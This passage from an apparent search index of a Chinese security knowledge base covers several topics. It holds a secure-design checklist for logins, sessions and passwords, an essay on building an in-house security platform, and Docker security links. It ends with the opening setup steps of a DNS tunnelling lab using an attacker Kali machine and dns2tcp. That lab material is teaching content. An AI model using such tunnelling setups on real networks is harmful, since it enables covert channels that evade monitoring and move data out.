\u6bcf\u6b21\u8bf7\u6c42\u9700\u8981\u4f7f\u7528\u65b0\u7684\u56fe\u5f62\u9a8c\u8bc1\u7801\u3002","title":"\u56fe\u5f62\u9a8c\u8bc1\u7801"},{"location":"other-security-branch/security-operation/pst/#_4","text":"\u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u83b7\u53d6\u624b\u673a\u53f7/\u90ae\u7bb1\u5fc5\u987b\u8bbe\u7f6e\u5355\u4f4d\u65f6\u95f4\u5185\u53d1\u9001\u9891\u7387\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u83b7\u53d6\u624b\u673a\u53f7/\u90ae\u7bb1\u5fc5\u987b\u8bbe\u7f6e\u5355\u4f4d\u65f6\u95f4\u5185\u53d1\u9001\u603b\u91cf\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u6bcf\u6b21\u968f\u673a\u751f\u6210\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u5fc5\u987b\u6ee1\u8db3\u6709\u6548\u671f\uff08\u6709\u6548\u65f6\u95f4\u4e0e\u9519\u8bef\u6b21\u6570\uff09\uff0c\u8fc7\u671f\u540e\u7acb\u5373\u5931\u6548\uff1b\u4f7f\u7528\u540e\u5e94\u8be5\u7acb\u5373\u8fc7\u671f\u3002\u5173\u4e8e\u77ed\u4fe1\u9a8c\u8bc1\u7801\u7684\u6709\u6548\u671f\u5efa\u8bae\uff1a4\u4f4d\u4e0d\u8d85\u8fc75\u5206\u949f\u30016\u4f4d\u4e0d\u8d85\u8fc715\u5206\u949f\u3002 \u8bf7\u6c42\u83b7\u53d6\u77ed\u4fe1\u7684\u63a5\u53e3\u5e94\u8be5\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u6216\u6dfb\u52a0\u5176\u5b83\u7684\u98ce\u63a7\u624b\u6bb5\u3002","title":"\u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801"},{"location":"other-security-branch/security-operation/pst/#_5","text":"\u5c3d\u53ef\u80fd\u4e0d\u8981\u5b58\u5728\u6b64\u7c7b\u63a5\u53e3\u3002 \u5982\u679c\u5fc5\u987b\u5b58\u5728\uff0c\u9700\u8981\u5bf9\u6b64\u7c7b\u63a5\u53e3\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u6216\u6dfb\u52a0\u5176\u5b83\u7684\u98ce\u63a7\u624b\u6bb5\u3002","title":"\u5224\u65ad\u8d26\u6237\u662f\u5426\u5b58\u5728"},{"location":"other-security-branch/security-operation/pst/#_6","text":"\u5bc6\u7801\u957f\u5ea6\u5e94\u8be5\u4e0d\u5c0f\u4e8e8\u4f4d\u3002 \u5bc6\u7801\u590d\u6742\u5ea6\u4e0d\u80fd\u4f4e\u4e8e\u4e09\u8981\u7d20\uff08\u5927\u5c0f\u5199\u5b57\u6bcd+\u6570\u5b57\uff09\uff1b\u6d89\u53ca\u98ce\u9669\u7ea7\u522b\u8f83\u9ad8\u7684\u7cfb\u7edf\u8d26\u6237\u5bc6\u7801\u590d\u6742\u5ea6\u4e0d\u80fd\u4f4e\u4e8e\u56db\u8981\u7d20\uff08\u5927\u5c0f\u5199\u5b57\u6bcd+\u6570\u5b57+\u7279\u6b8a\u5b57\u7b26\uff09\u3002 \u5bc6\u7801\u4e0d\u80fd\u4e0e\u5e38\u89c1\u5f31\u53e3\u4ee4\u5339\u914d\uff0c\u5982\uff1a123456\u3001Qwer1234\u3001Admin@110\u7b49\u3002","title":"\u5bc6\u7801\u7b56\u7565"},{"location":"other-security-branch/security-operation/pst/#_7","text":"\u6bcf\u6b21\u4f1a\u8bdd\u751f\u6210\u4e0d\u540c\u7684\u4f1a\u8bddtoken/session\uff0c\u4e14token/session\u5fc5\u987b\u8db3\u591f\u968f\u673a\uff08\u5177\u6709\u4e0d\u53ef\u9884\u6d4b\u6027\uff09\u3002 \u4f1a\u8bddtoken/session\u5fc5\u987b\u8bbe\u7f6e\u5408\u7406\u7684\u8d85\u65f6\u673a\u5236\u3002 \u8d26\u6237\u6ce8\u9500/\u7981\u7528\u540e\u5fc5\u987b\u5f3a\u5236token/session\u8fc7\u671f\u3002 \u5728\u4f1a\u8bddCookie\u4e2d\u6dfb\u52a0 HttpOnly \u4e0e Secure \u5c5e\u6027\u3002 \u662f\u5426\u5141\u8bb8\u8d26\u6237\u591a\u8bbe\u5907\u767b\u5f55\uff0c\u5982\u679c\u5141\u8bb8\u9700\u8981\u9650\u5236\u5e38\u7528\u8bbe\u5907\u3002","title":"\u4f1a\u8bdd\u7ba1\u7406"},{"location":"other-security-branch/security-operation/pst/#_8","text":"\u540e\u53f0\u9875\u9762\u5fc5\u987b\u901a\u8fc7\u8ba4\u8bc1\u540e\u624d\u80fd\u8bbf\u95ee\u3002 \u5fc5\u987b\u9a8c\u8bc1\u8d26\u6237\u662f\u5426\u5177\u5907\u5f53\u524d\u9875\u9762\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u8bf7\u6c42\u4e2d\u4e0d\u5141\u8bb8\u4f7f\u7528\u7528\u6237\u7684userid\u3001phonenum\u3001email\u7b49\u4f5c\u4e3a\u7528\u6237\u7684\u8eab\u4efd\u6807\u8bc6\uff0c\u9700\u8981\u4f7f\u7528token/session\u4f5c\u4e3a\u6807\u8bc6\u3002 \u7528\u6237\u53ea\u5141\u8bb8\u67e5\u770b\u81ea\u5df1\u6240\u62e5\u6709\u6743\u9650\u7684\u529f\u80fd\u3001\u9875\u9762\u3001\u6570\u636e\u3002","title":"\u8bbf\u95ee\u63a7\u5236"},{"location":"other-security-branch/security-operation/pst/#_9","text":"","title":"\u7528\u6237\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_10","text":"\u6ce8\u518c\u8fc7\u7a0b\u4e2d\u9700\u8981\u6821\u9a8c\u7528\u6237\u7684\u8eab\u4efd\uff0c\u5982\u679c\u4e0d\u9700\u8981\u6821\u9a8c\u7684\u6ce8\u518c\u9700\u8981\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff0c\u4e14\u9a8c\u8bc1\u7801\u6ee1\u8db3\u9a8c\u8bc1\u7801\u5b89\u5168\u8981\u6c42\u3002","title":"\u6ce8\u518c"},{"location":"other-security-branch/security-operation/pst/#_11","text":"\u5408\u7406\u7684\u63d0\u793a\u6587\u6848\uff1a\u4e0d\u8bba\u7528\u6237\u540d\u9519\u8bef\u8fd8\u662f\u5bc6\u7801\u9519\u8bef\uff0c\u7edf\u4e00\u63d0\u793a \u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef \u3002 \u8bbe\u7f6e\u540c\u4e00\u8d26\u53f7\u5355\u4f4d\u65f6\u95f4\u5185\u5141\u8bb8\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570\uff0c\u901a\u5e38\u4e3a1\u5206\u949f5\u6b21\u3002\u8d85\u8fc7\u6b21\u6570\u540e\u9501\u5b9a\u8d26\u6237\u4e00\u5b9a\u65f6\u95f4\uff08\u901a\u5e38\u4e3a1H\uff09\uff1b\u4e5f\u53ef\u4ee5\u9488\u5bf9\u8be5\u7528\u6237\u5f00\u542f\u53cc\u56e0\u7d20\u6821\u9a8c\u3002 \u8bbe\u7f6e\u540c\u4e00IP\u5355\u4f4d\u65f6\u95f4\u5185\u5141\u8bb8\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570\uff0c\u901a\u5e38\u4e3a1\u5206\u949f60\u6b21\u3002\u8d85\u8fc7\u6b21\u6570\u540e\u53ef\u4ee5\u9488\u5bf9\u8be5IP\u5f00\u542f\u53cc\u56e0\u7d20\u6821\u9a8c\uff0c\u4e0d\u5efa\u8bae\u76f4\u63a5\u9488\u5bf9IP\u8fdb\u884c\u5c01\u7981\uff0c\u9700\u8981\u989d\u5916\u7684\u9a8c\u8bc1\u3002","title":"\u767b\u5f55"},{"location":"other-security-branch/security-operation/pst/#_12","text":"\u5408\u7406\u7684\u627e\u56de\u5bc6\u7801\u903b\u8f91\uff1a\u8f93\u5165\u7528\u6237\u8eab\u4efd\u4fe1\u606f\u3001\u83b7\u53d6\u9a8c\u8bc1\u4fe1\u606f\u3001\u6821\u9a8c\u9a8c\u8bc1\u4fe1\u606f\u3001\u91cd\u7f6e\u5bc6\u7801\u3002 \u5bc6\u7801\u5fc5\u987b\u6ee1\u8db3\u5bc6\u7801\u7b56\u7565\u3002","title":"\u627e\u56de\u5bc6\u7801"},{"location":"other-security-branch/security-operation/pst/#_13","text":"\u4fee\u6539\u5bc6\u7801\u65f6\uff1a\u9700\u8981\u6821\u9a8c\u7528\u6237\u7ed1\u5b9a\u7684\u8eab\u4efd\u4fe1\u606f\u3002 \u4fee\u6539\u5bc6\u7801\u65f6\uff1a\u5fc5\u987b\u540c\u65f6\u6821\u9a8c\u539f\u59cb\u5bc6\u7801\uff0c\u4e14\u65b0\u5bc6\u7801\u5e94\u8be5\u6ee1\u8db3\u5bc6\u7801\u7b56\u7565\u3002 \u4fee\u6539\u624b\u673a\u53f7\u65f6\uff1a\u4f18\u5148\u6821\u9a8c\u539f\u624b\u673a\u53f7\uff0c\u5982\u679c\u539f\u624b\u673a\u53f7\u4e0d\u53ef\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u5176\u5b83\u65b9\u5f0f\u6765\u6821\u9a8c\u3002 \u4fee\u6539\u624b\u673a\u53f7\u65f6\uff1a\u5fc5\u987b\u6821\u9a8c\u65b0\u7684\u624b\u673a\u53f7\u662f\u5426\u5c5e\u4e8e\u7528\u6237\u6240\u6709\u3002","title":"\u4fee\u6539\u4fe1\u606f"},{"location":"other-security-branch/security-operation/pst/#_14","text":"\u9700\u8981\u591a\u91cd\u7684\u6821\u9a8c\u624b\u6bb5\uff0c\u5982\uff1a\u8eab\u4efd\u8bc1\u7167\u7247+\u624b\u6301\u8eab\u4efd\u8bc1\u7167\u7247\u3002 \u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\u9700\u8981\u6ee1\u8db3\u4f20\u8f93\u5b89\u5168\u3001\u6570\u636e\u5b58\u50a8\u5b89\u5168\u4e0e\u6570\u636e\u4f7f\u7528\u5b89\u5168\u3002","title":"\u5b9e\u540d\u8ba4\u8bc1"},{"location":"other-security-branch/security-operation/pst/#_15","text":"\u672a\u5f00\u59cb\u7f16\u5199\u3002","title":"\u4ea4\u6613\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_16","text":"","title":"\u5145\u503c/\u63d0\u73b0\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_17","text":"\u7981\u6b62\u8d2d\u4e70\u5df2\u4e0b\u67b6\u7684\u5546\u54c1\u3002","title":"\u7535\u5546\u8d2d\u7269\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_18","text":"","title":"\u5176\u5b83\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_19","text":"\u9700\u8981\u8bb0\u5f55\u7528\u6237\u65e5\u5fd7\u6570\u636e\u65b9\u4fbf\u540e\u671f\u5ba1\u8ba1\u3002 \u65e5\u5fd7\u6570\u636e\u5b58\u50a8\u9700\u8981\u6ee1\u8db3\u5408\u7406\u7684\u65f6\u957f\u3002 \u65e5\u5fd7\u4e2d\u7981\u6b62\u8bb0\u5f55\u654f\u611f\u4fe1\u606f\uff0c\u5982\uff1a\u7528\u6237\u8eab\u4efd\u4fe1\u606f\u3001\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u7b49\u3002","title":"\u65e5\u5fd7\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_20","text":"\u4e1a\u52a1\u7cfb\u7edf\u91c7\u7528\u5168\u7ad9https\u3002 \u654f\u611f\u6570\u636e\uff08\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801\u3001token/session\u3001\u8eab\u4efd\u4fe1\u606f\u7b49\uff09\u9700\u8981\u4ee5http post\u7684\u65b9\u5f0f\u63d0\u4ea4\u3002","title":"\u5b89\u5168\u4f20\u8f93\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_21","text":"\u654f\u611f\u6570\u636e\u9700\u8981\u52a0\u5bc6\u4fdd\u5b58\uff0c\u4e14\u52a0\u5bc6\u7b97\u6cd5\u6ee1\u8db3\u7b97\u6cd5\u5b89\u5168\u9700\u6c42\u3002","title":"\u6570\u636e\u5b58\u50a8\u5b89\u5168"},{"location":"other-security-branch/security-operation/pst/#_22","text":"\u654f\u611f\u6570\u636e\u8131\u654f\u5c55\u793a\u3002","title":"\u6570\u636e\u4f7f\u7528\u5b89\u5168"},{"location":"other-security-branch/security-operation/pst/#_23","text":"\u4e0a\u4f20\u6587\u4ef6\u5e94\u8be5\u6ee1\u8db3\u683c\u5f0f\u8981\u6c42\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u4e0a\u4f20\u811a\u672c\u7c7b\u578b\u6587\u4ef6\u3002 \u9650\u5236\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u7684\u6743\u9650\u3002","title":"\u4e0a\u4f20/\u4e0b\u8f7d"},{"location":"other-security-branch/security-operation/pst/#_24","text":"\u9650\u5236\u7528\u6237\u5355\u4f4d\u65f6\u95f4\u5185\u5bfc\u51fa\u6570\u636e\u3002 \u6821\u9a8c\u7528\u6237\u5bfc\u5165\u6570\u636e\u683c\u5f0f\u3002","title":"\u5bfc\u5165/\u5bfc\u51fa"},{"location":"other-security-branch/security-operation/pst/#_25","text":"\u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u7b97\u6cd5\u8fdb\u884c\u52a0\u5bc6\uff1aMD5\u3001DES\u3001SHA1\u7b49\uff0c\u63a8\u8350\u4f7f\u7528\uff1aAES128\u3001RSA2048\u3001DSA2048\u3002 \u4e0d\u8981\u4f7f\u7528\u79c1\u6709\u52a0\u5bc6\u7b97\u6cd5\u3002","title":"\u7b97\u6cd5\u5b89\u5168"},{"location":"other-security-branch/security-operation/pst/#_26","text":"\u7528\u6237\u8eab\u4efd\u4fe1\u606f\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\u3001\u8eab\u4efd\u8bc1\u53f7\u7b49\u3002","title":"\u5907\u6ce8"},{"location":"other-security-branch/security-operation/pst/#_27","text":"\u672c\u6587\u53c2\u8003\u4e86VIPKID\u7684\u5b89\u5168\u8bbe\u8ba1\u7ea2\u7ebf\u3002 \u5b89\u5168\u8bbe\u8ba1Checklist \u91d1\u878d\u79d1\u6280SDL\u5b89\u5168\u8bbe\u8ba1checklist","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/security-operation/security-platform/","text":"\u4e2d\u5c0f\u578b\u4f01\u4e1a\u81ea\u5efa\u5b89\u5168\u5e73\u53f0 \u5907\u6ce81\uff1a\u672c\u6587\u662f\u4e00\u4e2a\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u601d\u8def\u7684\u6587\u7ae0\uff0c\u8be6\u7ec6\u7684\u5b9e\u73b0\u90e8\u5206\u5c06\u4f1a\u5728\u540e\u7eed\u51e0\u7bc7\u4e2d\u66f4\u65b0\u51fa\u6765 \u5907\u6ce82\uff1a\u672c\u6587\u662f\u4f5c\u8005\u81ea\u5df1\u6240\u5728\u516c\u53f8\u7684\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u4e4b\u8def\uff0c\u53ef\u80fd\u4e0d\u662f\u901a\u7528\u573a\u666f\uff0c\u4e5f\u53ef\u80fd\u89c1\u8bc6\u4e0d\u591f\uff0c\u6b22\u8fce\u5927\u5bb6diss \u4e3a\u4ec0\u4e48\u8981\u81ea\u5efa\u5b89\u5168\u5e73\u53f0 \u4e3a\u4e86\u89e3\u51b3\u5e38\u89c4\u5b89\u5168\u5de5\u4f5c\u81ea\u52a8\u5316\u3001\u5b89\u5168\u5de5\u4f5c\u7684\u7edf\u4e00\u7ba1\u7406\u4ee5\u53ca\u5b89\u5168\u5de5\u4f5c\u91cf\u5316\u7b49\uff0c\u5f88\u591a\u516c\u53f8\u5728\u5b89\u5168\u8fbe\u5230\u4e86\u4e00\u5b9a\u89c4\u6a21\u7684\u60c5\u51b5\u4e0b\u4f1a\u81ea\u5efa\u5b89\u5168\u5e73\u53f0\u3002\u8fd9\u91cc\u7684\u5b89\u5168\u5e73\u53f0\u4e0e\u5b89\u5168\u8fd0\u8425\u4e2d\u5fc3\uff08SOC\uff09\u662f\u6709\u4e00\u5b9a\u7684\u5dee\u5f02\u7684\uff0c\u5b89\u5168\u5e73\u53f0\u7684\u542b\u4e49\u66f4\u52a0\u5e7f\u6cdb\u3002 \u9996\u5148\u56de\u7b54\u51e0\u4e2a\u95ee\u9898 Q\uff1a\u5b89\u5168\u5e73\u53f0\u7684\u610f\u4e49\u662f\u4ec0\u4e48\uff1f A\uff1a\u5b89\u5168\u5e73\u53f0\u66f4\u591a\u7684\u662f\u5c06\u5f88\u591a\u5e38\u89c4\u7684\u5b89\u5168\u5de5\u4f5c\u96c6\u4e2d\u5230\u4e00\u4e2a\u5e73\u53f0\u4e2d\u5e76\u4e14\u9010\u6b65\u5b9e\u73b0\u81ea\u52a8\u5316\u7684\u8fc7\u7a0b\u3002 Q\uff1a\u4f60\u7406\u89e3\u7684\u5b89\u5168\u5e73\u53f0\u5305\u62ec\u54ea\u4e9b\uff1f A\uff1a\u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\uff1a\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u4e0e\u8fd0\u7ef4CMDB\u6709\u4ea4\u96c6\uff0c\u4f46\u662f\u901a\u8fc7\u672c\u4eba\u4e0e\u8fd0\u7ef4\u540c\u4e8b\u7684\u6c9f\u901a\u53d1\u73b0\u4e8c\u8005\u7684\u9700\u6c42\u5728\u5b9e\u73b0\u4e0a\u8981\u8fbe\u5230\u5171\u5b58\u96be\u5ea6\u5f88\u9ad8\uff1b\u8fd8\u5305\u62ec\u5b89\u5168\u626b\u63cf\u3001\u6f0f\u6d1e\u7ba1\u7406\u7b49\uff0c\u8be6\u7ec6\u7684\u5185\u5bb9\uff0c\u6211\u5c06\u4f1a\u5728\u4e0b\u4e00\u8282\u5c55\u793a\u51fa\u6765\u3002 Q\uff1a\u4f60\u63d0\u5230\u7684\u5b89\u5168\u626b\u63cf\u3001\u6f0f\u6d1e\u7ba1\u7406\u8fd9\u4e9b\u90fd\u6709\u5f00\u6e90\u7684\u5de5\u5177\uff0c\u4e3a\u4ec0\u4e48\u8981\u9009\u62e9\u91cd\u590d\u9020\u8f6e\u5b50\uff1f A\uff1a\u4e2d\u5c0f\u578b\u4f01\u4e1a\u5f53\u9010\u6b65\u4ece\u6551\u706b\u9636\u6bb5\u8fc7\u6e21\u5230\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u901a\u8fc7\u9020\u8f6e\u5b50\u9009\u62e9\u51fa\u6700\u9002\u5408\u81ea\u5df1\u516c\u53f8\u7684\u6a21\u5f0f\u3002 Q\uff1a\u5176\u4ed6\u95ee\u9898\u7b49\u6211\u60f3\u5230\uff0c\u518d\u7ee7\u7eed\u66f4\u65b0\u5427\uff01 \u4e00\u4e2a\u5b89\u5168\u5e73\u53f0\u5e94\u8be5\u5305\u62ec\u54ea\u4e9b\u4e1c\u897f xmind\u7248\u672c \u5bc6\u7801:0jkd \u4ee3\u7801\u5b9e\u73b0 \u6b32\u77e5\u540e\u4e8b\u5982\u4f55\uff0c\u4e14\u542c\u4e0b\u56de\u5206\u89e3\u3002","title":"\u4e2d\u5c0f\u578b\u4f01\u4e1a\u81ea\u5efa\u5b89\u5168\u5e73\u53f0"},{"location":"other-security-branch/security-operation/security-platform/#_1","text":"\u5907\u6ce81\uff1a\u672c\u6587\u662f\u4e00\u4e2a\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u601d\u8def\u7684\u6587\u7ae0\uff0c\u8be6\u7ec6\u7684\u5b9e\u73b0\u90e8\u5206\u5c06\u4f1a\u5728\u540e\u7eed\u51e0\u7bc7\u4e2d\u66f4\u65b0\u51fa\u6765 \u5907\u6ce82\uff1a\u672c\u6587\u662f\u4f5c\u8005\u81ea\u5df1\u6240\u5728\u516c\u53f8\u7684\u5b89\u5168\u5e73\u53f0\u5efa\u8bbe\u4e4b\u8def\uff0c\u53ef\u80fd\u4e0d\u662f\u901a\u7528\u573a\u666f\uff0c\u4e5f\u53ef\u80fd\u89c1\u8bc6\u4e0d\u591f\uff0c\u6b22\u8fce\u5927\u5bb6diss","title":"\u4e2d\u5c0f\u578b\u4f01\u4e1a\u81ea\u5efa\u5b89\u5168\u5e73\u53f0"},{"location":"other-security-branch/security-operation/security-platform/#_2","text":"\u4e3a\u4e86\u89e3\u51b3\u5e38\u89c4\u5b89\u5168\u5de5\u4f5c\u81ea\u52a8\u5316\u3001\u5b89\u5168\u5de5\u4f5c\u7684\u7edf\u4e00\u7ba1\u7406\u4ee5\u53ca\u5b89\u5168\u5de5\u4f5c\u91cf\u5316\u7b49\uff0c\u5f88\u591a\u516c\u53f8\u5728\u5b89\u5168\u8fbe\u5230\u4e86\u4e00\u5b9a\u89c4\u6a21\u7684\u60c5\u51b5\u4e0b\u4f1a\u81ea\u5efa\u5b89\u5168\u5e73\u53f0\u3002\u8fd9\u91cc\u7684\u5b89\u5168\u5e73\u53f0\u4e0e\u5b89\u5168\u8fd0\u8425\u4e2d\u5fc3\uff08SOC\uff09\u662f\u6709\u4e00\u5b9a\u7684\u5dee\u5f02\u7684\uff0c\u5b89\u5168\u5e73\u53f0\u7684\u542b\u4e49\u66f4\u52a0\u5e7f\u6cdb\u3002 \u9996\u5148\u56de\u7b54\u51e0\u4e2a\u95ee\u9898 Q\uff1a\u5b89\u5168\u5e73\u53f0\u7684\u610f\u4e49\u662f\u4ec0\u4e48\uff1f A\uff1a\u5b89\u5168\u5e73\u53f0\u66f4\u591a\u7684\u662f\u5c06\u5f88\u591a\u5e38\u89c4\u7684\u5b89\u5168\u5de5\u4f5c\u96c6\u4e2d\u5230\u4e00\u4e2a\u5e73\u53f0\u4e2d\u5e76\u4e14\u9010\u6b65\u5b9e\u73b0\u81ea\u52a8\u5316\u7684\u8fc7\u7a0b\u3002 Q\uff1a\u4f60\u7406\u89e3\u7684\u5b89\u5168\u5e73\u53f0\u5305\u62ec\u54ea\u4e9b\uff1f A\uff1a\u5b89\u5168\u8d44\u4ea7\u7ba1\u7406\uff1a\u5b89\u5168\u7684\u8d44\u4ea7\u7ba1\u7406\u4e0e\u8fd0\u7ef4CMDB\u6709\u4ea4\u96c6\uff0c\u4f46\u662f\u901a\u8fc7\u672c\u4eba\u4e0e\u8fd0\u7ef4\u540c\u4e8b\u7684\u6c9f\u901a\u53d1\u73b0\u4e8c\u8005\u7684\u9700\u6c42\u5728\u5b9e\u73b0\u4e0a\u8981\u8fbe\u5230\u5171\u5b58\u96be\u5ea6\u5f88\u9ad8\uff1b\u8fd8\u5305\u62ec\u5b89\u5168\u626b\u63cf\u3001\u6f0f\u6d1e\u7ba1\u7406\u7b49\uff0c\u8be6\u7ec6\u7684\u5185\u5bb9\uff0c\u6211\u5c06\u4f1a\u5728\u4e0b\u4e00\u8282\u5c55\u793a\u51fa\u6765\u3002 Q\uff1a\u4f60\u63d0\u5230\u7684\u5b89\u5168\u626b\u63cf\u3001\u6f0f\u6d1e\u7ba1\u7406\u8fd9\u4e9b\u90fd\u6709\u5f00\u6e90\u7684\u5de5\u5177\uff0c\u4e3a\u4ec0\u4e48\u8981\u9009\u62e9\u91cd\u590d\u9020\u8f6e\u5b50\uff1f A\uff1a\u4e2d\u5c0f\u578b\u4f01\u4e1a\u5f53\u9010\u6b65\u4ece\u6551\u706b\u9636\u6bb5\u8fc7\u6e21\u5230\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u901a\u8fc7\u9020\u8f6e\u5b50\u9009\u62e9\u51fa\u6700\u9002\u5408\u81ea\u5df1\u516c\u53f8\u7684\u6a21\u5f0f\u3002 Q\uff1a\u5176\u4ed6\u95ee\u9898\u7b49\u6211\u60f3\u5230\uff0c\u518d\u7ee7\u7eed\u66f4\u65b0\u5427\uff01","title":"\u4e3a\u4ec0\u4e48\u8981\u81ea\u5efa\u5b89\u5168\u5e73\u53f0"},{"location":"other-security-branch/security-operation/security-platform/#_3","text":"xmind\u7248\u672c \u5bc6\u7801:0jkd","title":"\u4e00\u4e2a\u5b89\u5168\u5e73\u53f0\u5e94\u8be5\u5305\u62ec\u54ea\u4e9b\u4e1c\u897f"},{"location":"other-security-branch/security-operation/security-platform/#_4","text":"\u6b32\u77e5\u540e\u4e8b\u5982\u4f55\uff0c\u4e14\u542c\u4e0b\u56de\u5206\u89e3\u3002","title":"\u4ee3\u7801\u5b9e\u73b0"},{"location":"other-security-branch/virtualization-security/docker-security/","text":"Docker\u5b89\u5168\u603b\u7ed3 docker\u4e0e\u865a\u62df\u673a\u7684\u533a\u522b \u5bb9\u5668\uff1a\u865a\u62df\u64cd\u4f5c\u7cfb\u7edf \u865a\u62df\u673a\uff1a\u865a\u62df\u786c\u4ef6 \u53c2\u8003\u8d44\u6599 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e00\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e8c\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e09\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u56db\uff09 Docker\u5168\u9762\u7684\u5b89\u5168\u9632\u62a4","title":"Docker\u5b89\u5168\u603b\u7ed3"},{"location":"other-security-branch/virtualization-security/docker-security/#docker","text":"","title":"Docker\u5b89\u5168\u603b\u7ed3"},{"location":"other-security-branch/virtualization-security/docker-security/#docker_1","text":"\u5bb9\u5668\uff1a\u865a\u62df\u64cd\u4f5c\u7cfb\u7edf \u865a\u62df\u673a\uff1a\u865a\u62df\u786c\u4ef6","title":"docker\u4e0e\u865a\u62df\u673a\u7684\u533a\u522b"},{"location":"other-security-branch/virtualization-security/docker-security/#_1","text":"Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e00\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e8c\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u4e09\uff09 Docker\u5b89\u5168\u5165\u95e8\u4e0e\u5b9e\u6218\uff08\u56db\uff09 Docker\u5168\u9762\u7684\u5b89\u5168\u9632\u62a4","title":"\u53c2\u8003\u8d44\u6599"},{"location":"red_vs_blue/dns_tunnel/","text":"DNS\u96a7\u9053\u6280\u672f \u96a7\u9053\u6280\u672f\uff08Tunneling\uff09\u662f\u4e00\u79cd\u901a\u8fc7\u4f7f\u7528\u4e92\u8054\u7f51\u7edc\u7684\u57fa\u7840\u8bbe\u65bd\u5728\u7f51\u7edc\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u7684\u65b9\u5f0f\u3002\u4f7f\u7528\u96a7\u9053\u4f20\u9012\u7684\u6570\u636e\uff08\u6216\u8d1f\u8f7d\uff09\u53ef\u4ee5\u662f\u4e0d\u540c\u534f\u8bae\u7684\u6570\u636e\u5e27\u6216\u5305\u3002\u96a7\u9053\u534f\u8bae\u5c06\u5176\u5b83\u534f\u8bae\u7684\u6570\u636e\u5e27\u6216\u5305\u91cd\u65b0\u5c01\u88c5\u7136\u540e\u901a\u8fc7\u96a7\u9053\u53d1\u9001\u3002\u65b0\u7684\u5e27\u5934\u63d0\u4f9b\u8def\u7531\u4fe1\u606f\uff0c\u4ee5\u4fbf\u901a\u8fc7\u4e92\u8054\u7f51\u4f20\u9012\u88ab\u5c01\u88c5\u7684\u8d1f\u8f7d\u6570\u636e\u3002 \u5b9e\u73b0DNS\u96a7\u9053 \u73af\u5883\uff1a\u653b\u51fb\u673a\uff08kali\uff09\u3001DNS\u670d\u52a1\u5668\uff08Windows Server 2003\uff09\u3001\u76ee\u6807\u670d\u52a1\u5668\uff08centos7\uff09 DNS\u670d\u52a1\u5668\u914d\u7f6e DNS\u670d\u52a1\u5668IP\uff1a192.168.10.132 \u65b0\u5efa\u4e00\u4e2a\u540d\u5b57\u4e3a\"bloodzero.com\"\u7684\u6b63\u5411\u89e3\u6790\u57df \u65b0\u5efa\u4e00\u4e2a\u4e3b\u673a\uff0cIP\u4e3a\u653b\u51fb\u673akali\u7684IP \u65b0\u5efa\u4e00\u4e2a\u59d4\u6258 DNS\u670d\u52a1\u5668\u5df2\u7ecf\u914d\u7f6e\u5b8c\u6210\u3002 \u653b\u51fb\u673a\u914d\u7f6e \u653b\u51fb\u673a\uff08kali\uff09IP\uff1a192.168.10.135 \u4fee\u6539dns2tcpd\u914d\u7f6e\u6587\u4ef6 resources\u7684IP\u4fee\u6539\u4e3a\u76ee\u6807\u670d\u52a1\u5668\u7684IP \u542f\u52a8DNS\u96a7\u9053\u7684\u670d\u52a1\u7aef \u5220\u9664ssh\u8fde\u63a5\u7684known_hosts\u6587\u4ef6 \u4fee\u6539DNS\u89e3\u6790\u6587\u4ef6\uff1avim /etc/resolv.conf \u914d\u7f6eDNS\u96a7\u9053\u5ba2\u6237\u7aef\u5448\u73b0\uff0c\u5728kali2.0\u4e2d\uff0c\u6ca1\u6709\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u81ea\u5df1\u624b\u5199\uff1avim /etc/dns2tcpc.conf 